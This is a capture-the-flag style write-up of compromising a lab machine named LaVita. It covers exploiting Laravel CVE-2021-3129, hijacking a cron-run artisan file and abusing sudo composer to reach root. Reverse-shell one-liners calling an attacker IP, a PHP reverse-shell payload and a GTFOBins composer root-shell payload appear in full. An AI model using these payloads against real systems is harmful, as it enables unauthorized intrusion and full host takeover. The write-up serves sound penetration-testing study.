#Linux #Laravel #CVE-2021-3129 #RCE #Deserialization #CronJob #Composer #GTFOBins #sudo

## Overview

LaVita runs a Laravel 8.4.0 web application with debug mode accessible post-registration, making it vulnerable to CVE-2021-3129, an unauthenticated (post-auth) deserialization RCE via the Ignition debug endpoint. Getting a shell as `www-data` is just the start: a cron job runs an `artisan` PHP file as a different user, and that file is replaceable. The resulting user account has sudo rights to `composer`, which GTFOBins turns into a root shell through a collaborative two-shell technique.

## Recon

### Port Scan

```sh
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
```

### Web Enumeration

Gobuster on port 80:

```sh
gobuster dir -u http://192.168.206.38/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -x php
/login                (Status: 200)
/register             (Status: 200)
/home                 (Status: 302) [--> /login]
/robots.txt           (Status: 200)
```

An error page from the application exposed the backend framework: **Laravel 8.4.0**.

## Foothold

### CVE-2021-3129, Laravel Debug Mode RCE

Laravel 8.4.0 with debug mode enabled is vulnerable to CVE-2021-3129, a deserialization attack through the `/_ignition/execute-solution` endpoint. The exploit requires an account to trigger debug mode, so I registered one, then ran the exploit script from GitHub (joshuavanderpoll/CVE-2021-3129), which brute-forces the Laravel log file path and chains PHPGGC gadget payloads:

```sh
python3 laravel.py --host="http://192.168.206.38"
[@] Testing vulnerable URL "http://192.168.206.38/_ignition/execute-solution"...
[√] Host seems vulnerable!
[√] Laravel log path: "/var/www/html/lavita/storage/logs/laravel.log"
[•] Laravel version found: "8.4.0"
```

> **How CVE-2021-3129 works:** Ignition, Laravel's debug handler, has a `MakeViewBladeWithErrors` solution that writes a PHP deserialization payload into the application log and then includes that log file. Because PHP's unserialise processes the payload during inclusion, and PHPGGC provides Laravel-specific RCE gadget chains, this turns the debug endpoint into arbitrary code execution. Debug mode is required, but any registered user can enable it.

The exploit only reliably runs one command per invocation. I restarted the script and used the single execution window to send a reverse shell:

```sh
[?] Please enter a command to execute: execute nc 192.168.45.167 80 -e /bin/bash
```

```sh
rlwrap nc -lvnp 80
connect to [192.168.45.167] from (UNKNOWN) [192.168.206.38] 49248
whoami
www-data
```

TTY upgrade:

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Privilege Escalation

### Cron Job Hijack, www-data to skunk

LinPEAS and `pspy32s` revealed a cron job running as UID 1001 (`skunk`):

```sh
CMD: UID=1001  PID=17307  | /usr/bin/php /var/www/html/lavita/artisan clear:pictures
```

The `artisan` file is in the Laravel web root, which `www-data` owns. I removed the original and replaced it with a PHP reverse shell:

```sh
echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.167 4444>/tmp/f'); ?>" > artisan
```

When the cron triggered, a shell came back as `skunk`:

```sh
rlwrap nc -lvnp 4444
connect to [192.168.45.167] from (UNKNOWN) [192.168.206.38] 47772
$ whoami
skunk
```

`id` showed `skunk` is in the `sudo` group:

```sh
uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
```

### sudo composer, skunk to root

`sudo -l` as `skunk`:

```sh
(ALL : ALL) ALL
(root) NOPASSWD: /usr/bin/composer --working-dir=/var/www/html/lavita *
```

`skunk` cannot write to `/var/www/html/lavita`, but `www-data` can. This requires coordinating between the two shells. In the `www-data` shell, I replaced `composer.json` with a GTFOBins payload:

```sh
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
```

Back in the `skunk` shell, I ran the script:

```sh
sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
Do not run Composer as root/super user! See https://getcomposer.org/root for details
Continue as root/super user [yes]? yes
> /bin/sh -i 0<&3 1>&3 2>&3
# whoami
root
```

> **Why the composer GTFOBins method works:** `composer run-script` executes the script value as a shell command. Running it via `sudo` makes the shell spawn as root. The FD redirection (`0<&3 1>&3 2>&3`) attaches the shell's stdin/stdout/stderr to FD 3, which is the existing TTY.

## Root

```sh
# cat proof.txt
‹redacted›
```

## Takeaways

- **CVE-2021-3129 is a single-command-per-run quirk.** Restart the exploit script and burn the one execution window on a reverse shell rather than an `id` check.
- **`pspy` catches cron jobs that `crontab -l` hides.** The `skunk` cron wasn't in any readable crontab; process watching was the only way to find it.
- **Two-shell privilege escalation is valid technique.** When one account has write access and another has sudo, coordinate them: write the payload as the writer, trigger it as the sudo user.
- **GTFOBins `composer` entry works cleanly with `run-script`.** The FD redirect handles TTY attachment without needing a separate listener.
